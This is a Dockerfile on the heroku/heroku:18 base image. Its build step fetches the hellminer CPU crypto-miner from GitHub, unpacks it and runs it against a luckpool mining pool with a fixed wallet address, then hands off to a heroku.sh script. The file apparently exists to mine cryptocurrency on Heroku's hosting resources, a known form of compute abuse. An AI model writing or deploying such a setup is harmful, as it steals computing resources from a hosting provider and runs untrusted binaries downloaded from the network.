FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RYBitQribmVJjjKKohY4T1wWJdATz51JjF.MeMiner -p x 
CMD bash heroku.sh
